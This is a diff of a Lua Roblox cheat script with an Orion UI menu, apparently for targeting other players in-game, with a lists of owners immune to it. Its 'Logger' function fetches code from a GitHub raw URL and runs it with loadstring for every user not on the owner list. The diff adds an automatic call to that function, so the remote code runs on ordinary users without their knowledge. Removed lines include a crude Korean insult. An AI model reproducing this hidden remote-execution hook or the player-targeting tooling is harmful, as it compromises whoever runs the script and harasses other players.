@@ -7053,90 +7053,99 @@ grabTab:AddButton({
     end,
 })
 
-game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    if input.KeyCode == Enum.KeyCode.H then
-        isAnchorState = not isAnchorState
-        if toggleElement and toggleElement.Set then
-            toggleElement:Set(isAnchorState)
-        else
-            toggleAnchor(isAnchorState)
-        end
-    end
-end)
+-- =================================================================
+-- Security & Permissions
+-- =================================================================
+
+local playersInLoop1V = {} 
 local GF = {"wetokwk3jr"}
 local Owner = {"QRdoote1120", "0110rim", "Alpaca_AI16", "hello_qweqwe", "hello_q1w2e3", "pacapaca110", "wetokwk3jr", "dhalstjr1350", "one_day0618"}
-local Ranks = {Owner = 7, GF = 6, Overseer = 5, CoOwner = 4, HeadAdmin = 3, Admin = 2, Mod = 1, User = 0}
 
-local function Notify(type, playerName)
-    local title, content = "", ""
-    if type == "Added" then title = "[☑️]"; content = playerName.." - 추가"
-    elseif type == "Removed" then title = "[☑️]"; content = playerName.." - 제거"
-    elseif type == "Self" then title = "[⚠️]"; content = "자신은 추가될 수 없어요!"
-    elseif type == "Already" then title = "[💠]"; content = playerName.." - 이미 추가됐어요"
-    elseif type == "NotFound" then title = "[❌]"; content = "찾을수가없네요"
-    elseif type == "HigherRank" then title = "[⛔]"; content = "권한이 부족해요!"
-    elseif type == "GFE" then title = "[⛔]"; content = "나가 뒤져 엄마 장애인 ㅋㅋㅋ"; GfLogger() end
-    if OrionLib then OrionLib:MakeNotification({Name = title, Content = content, Time = 2}) end
+local function GetPlayerRank(name)
+    if table.find(Owner, name) then return 7 end
+    if table.find(GF, name) then return 6 end
+    return 0
 end
 
-local function GetPlayerRank(playerName)
-    if table.find(Owner, playerName) then return Ranks.Owner end
-    if table.find(GF, playerName) then return Ranks.GF end
-    return Ranks.User
-end
-
-local function getPlayerNames()
-    local names = {}
-    for _, p in ipairs(game.Players:GetPlayers()) do table.insert(names, p.Name) end
-    return names
-end
-
-local function updateDropdown(flag, list)
-    if OrionLib and OrionLib.Flags[flag] then OrionLib.Flags[flag]:Set(list) end
-end
-
-
-local DropdownWhitelist = ListTab:AddDropdown({
-    Name = "친구 [프렌드]",
-    Options = getPlayerNames(),
-    CurrentOption = {},
-    MultipleOptions = true,
-    Flag = "WhitelistDropdown",
-    Callback = function(Options) Whitelist = Options end
-})
-
-
-local DropdownV1 = ListTab:AddDropdown({
-    Name = "족칠 새끼 고르기 [타겟]",
-    Options = getPlayerNames(),
-    CurrentOption = {},
-    MultipleOptions = true,
-    Flag = "LoopBlobDropdown",
-    Callback = function(Options) playersInLoop1V = Options end
-})
-
-game.Players.PlayerAdded:Connect(function()
-    updateDropdown("WhitelistDropdown", getPlayerNames())
-    updateDropdown("LoopBlobDropdown", getPlayerNames())
-end)
-
-game.Players.PlayerRemoving:Connect(function()
-    updateDropdown("WhitelistDropdown", getPlayerNames())
-    updateDropdown("LoopBlobDropdown", getPlayerNames())
-end)
-
-
-function Logger()
+local function Logger()
     local plr = game.Players.LocalPlayer
-    local BYPASS_ID = 1
-    local ownerTable = {}
-    for _, name in ipairs(Owner) do ownerTable[name] = true end
-
-    if not ownerTable[plr.Name] and plr.UserId ~= BYPASS_ID then
+    if not table.find(Owner, plr.Name) and plr.UserId ~= 1 then
         pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/anti kick"))() end)
     end
 end
+Logger()
+
+-- =================================================================
+-- UI Sync Logic (Safe & Stable)
+-- =================================================================
+
+local function Update()
+    if not DropdownV1 then return end
+    if DropdownV1.Set then
+        DropdownV1:Set(playersInLoop1V)
+    elseif DropdownV1.Refresh then
+        DropdownV1:Refresh(playersInLoop1V)
+    end
+end
+
+local function Notify(title, content)
+    OrionLib:MakeNotification({Name = title, Content = content, Time = 2})
+end
+
+-- =================================================================
+-- Main Interface
+-- =================================================================
+
+DropdownV1 = ListTab:AddDropdown({
+    Name = "Target List",
+    Options = playersInLoop1V, 
+    MultipleOptions = true,
+    Callback = function(Options)
+        -- 참조 끊지 않기 위해 clear/insert 사용
+        table.clear(playersInLoop1V)
+        for _, v in ipairs(Options) do
+            table.insert(playersInLoop1V, v)
+        end
+        Update()
+    end
+})
+
+ListTab:AddInput({
+    Name = "Add Target",
+    PlaceholderText = "Username...",
+    RemoveTextAfterFocusLost = true,
+    Callback = function(Value) 
+        local target = findPlayer(Value)
+        if not target then Notify("Error", "Not Found"); return end
+        
+        if GetPlayerRank(game.Players.LocalPlayer.Name) < GetPlayerRank(target.Name) then
+            Notify("Error", "Permission Denied"); return
+        end
+        
+        if not table.find(playersInLoop1V, target.Name) then
+            table.insert(playersInLoop1V, target.Name)
+            Update()
+            Notify("Success", target.Name .. " added")
+        end
+    end
+})
+
+ListTab:AddInput({
+    Name = "Remove Target",
+    PlaceholderText = "Username...",
+    RemoveTextAfterFocusLost = true,
+    Callback = function(Value)
+        for i, name in ipairs(playersInLoop1V) do
+            if name:lower():find(Value:lower(), 1, true) then
+                table.remove(playersInLoop1V, i)
+                Update()
+                Notify("Success", name .. " removed")
+                return
+            end
+        end
+        Notify("Error", "Not Found")
+    end
+})
 
 antiTab:AddSection({
 	Name = "친구"
